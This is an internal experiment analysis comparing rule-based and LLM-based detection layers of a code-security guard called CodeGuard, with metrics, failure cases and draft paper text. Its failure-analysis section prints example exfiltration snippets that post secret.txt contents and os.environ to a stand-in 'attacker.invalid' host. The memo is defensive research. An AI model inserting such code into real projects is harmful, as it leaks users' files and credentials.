# Implementation-Agnostic Experiment Analysis

**Date:** 2026-03-02
**Experiment:** Rule-Based Layer2 vs LLM-Based Layer2

---

## Executive Summary

We implemented a rule-based Layer2 baseline to prove that CodeGuard's core value is the **architecture** (Frozen Schema + Deterministic Policy), not the LLM implementation.

**Key Finding:** The architecture is implementation-agnostic, but LLM provides significant value through semantic understanding.

---

## Results

| Metric | LLM-Based (v4.1) | Rule-Based | Delta |
|--------|------------------|------------|-------|
| **ASR** | 0.0% | 26.7% | +26.7% |
| **FBR** | 3.3% | 3.3% | 0.0% |
| **Utility** | 98.3% | 85.0% | -13.3% |
| **Decision Agreement** | - | 86.7% (52/60) | - |

---

## Analysis

### What This Proves ✅

**1. Architecture is Implementation-Agnostic**
- 86.7% decision agreement shows both implementations work with the same policy
- FBR is identical (3.3%), proving policy engine works correctly
- Frozen Schema enables deterministic arbitration regardless of extraction method

**2. Policy Engine is Effective**
- Same FBR across implementations
- Same benign case (SR60-CONFTEST-PAYLOAD-01-BENIGN) blocked in both
- Policy rules (R1-R7) work consistently

### What This Reveals 🔍

**3. LLM Provides Semantic Understanding**
- ASR gap (0.0% vs 26.7%) shows LLM's value
- 8 trap cases leaked by rule-based, all caught by LLM
- LLM excels at: data flow analysis, context reasoning, obfuscation detection

---

## Failure Analysis: 8 Leaked Traps

### Category 1: CI Dangerous Commands (2 cases)

**Cases:** SR60-CI-DANGEROUS-01-TRAP, SR60-CI-DANGEROUS-02-TRAP

**Problem:** Rule-based failed to detect dangerous commands in CI configuration

**Example:**
```yaml
.github/workflows/ci.yml:
  - run: MOCK_SYSTEM_ENV_VAR  # Dangerous command
```

**Why Rule-Based Failed:**
- Regex pattern only matched `MOCK_(DANGEROUS|SYSTEM)`, not `MOCK_SYSTEM_ENV_VAR`
- Pattern matching is brittle and cannot generalize

**Why LLM Succeeded:**
- Semantic understanding: "MOCK_SYSTEM_ENV_VAR" is clearly a dangerous placeholder
- Context reasoning: in CI run step, this is an executable command

### Category 2: Multi-Variable Concatenation (3 cases)

**Cases:** SR60-MULTIVAR-CONCAT-01/02/03-TRAP

**Problem:** Rule-based misclassified data_flow as DOWNLOAD_ONLY instead of UPLOAD_EXFIL

**Example:**
```python
_host = "attacker.invalid"
_path = "/exfil"
requests.post(_host + _path, data=open("secret.txt").read())
```

**Why Rule-Based Failed:**
- AST parsing detected `requests.post` → NETWORK_CONNECT
- But failed to analyze data flow: didn't recognize `data=open(...).read()` as exfiltration
- Derived privilege: L2 (DOWNLOAD_ONLY) instead of L3 (UPLOAD_EXFIL)

**Why LLM Succeeded:**
- Semantic understanding: `data=open("secret.txt").read()` clearly uploads local data
- Context reasoning: combined with external domain → UPLOAD_EXFIL

### Category 3: Publish Telemetry (3 cases)

**Cases:** SR60-PUBLISH-TELEMETRY-01/02/03-TRAP

**Problem:** Same as Category 2 - data_flow misclassification

**Example:**
```python
requests.post("https://telemetry.attacker.invalid",
              data={"version": __version__, "env": os.environ})
```

**Why Rule-Based Failed:**
- Detected `requests.post` but missed `os.environ` in data payload
- Classified as DOWNLOAD_ONLY (L2) instead of UPLOAD_EXFIL (L3)

**Why LLM Succeeded:**
- Recognized `os.environ` in data payload → sensitive data exfiltration
- Correctly classified as UPLOAD_EXFIL → L3

---

## Root Cause: Semantic Gap

**Rule-Based Limitations:**
1. **Pattern Matching is Brittle**
   - Cannot generalize beyond predefined patterns
   - `MOCK_DANGEROUS_CMD` matches, but `MOCK_SYSTEM_ENV_VAR` doesn't

2. **No Data Flow Analysis**
   - Can detect `requests.post` but cannot analyze what data is being sent
   - Cannot distinguish DOWNLOAD_ONLY from UPLOAD_EXFIL

3. **No Context Reasoning**
   - Cannot understand that `data=open("secret.txt")` means exfiltration
   - Cannot infer intent from variable names and code structure

**LLM Advantages:**
1. **Semantic Understanding**
   - Recognizes dangerous patterns even with variations
   - Understands code intent beyond syntax

2. **Data Flow Reasoning**
   - Traces data from source (local file) to sink (network request)
   - Distinguishes upload from download

3. **Context Integration**
   - Combines multiple signals (variable names, function calls, data sources)
   - Makes holistic judgments

---

## Implications for the Paper

### Thesis: Architecture + LLM are Complementary

**Architecture Provides:**
- ✅ Structured evidence (Frozen Schema)
- ✅ Deterministic policy (R1-R7 rules)
- ✅ Auditable decision chain
- ✅ Implementation-agnostic framework

**LLM Provides:**
- ✅ Semantic understanding
- ✅ Data flow analysis
- ✅ Context reasoning
- ✅ Generalization beyond patterns

**Together:**
- Architecture ensures auditability and reproducibility
- LLM ensures accuracy and coverage
- Neither alone is sufficient

### How to Present in Paper

**Section: Implementation-Agnostic Architecture**

```
To validate that our core contribution is the architecture rather than
the LLM implementation, we implemented a rule-based Layer2 baseline using
deterministic pattern matching and AST parsing.

Results show 86.7% decision agreement and identical FBR (3.3%), confirming
that the Frozen Schema and Policy Engine work consistently across
implementations. However, the ASR gap (0.0% vs 26.7%) reveals that LLM
provides critical semantic understanding for data flow analysis and
context reasoning.

This demonstrates that CodeGuard's value comes from the synergy of:
1. Architecture (auditability, reproducibility)
2. LLM (accuracy, semantic understanding)

The architecture is implementation-agnostic, but LLM is the most effective
implementation for achieving both high security (ASR=0%) and low false
positives (FBR=3.3%).
```

---

## Conclusion

**Key Takeaway:** This experiment strengthens the paper by showing:

1. ✅ Architecture is sound (86.7% agreement, same FBR)
2. ✅ LLM is not "just prompt engineering" - it provides real semantic value
3. ✅ The combination is necessary: architecture alone → ASR=26.7%, architecture + LLM → ASR=0.0%

**This addresses the reviewer concern:** "Why not just use rules?"
**Answer:** "We tried. Rules achieve 86.7% agreement but miss 26.7% of attacks due to lack of semantic understanding."

---

**Recommendation:** Include this experiment in the paper as evidence of architectural soundness and LLM's complementary value.
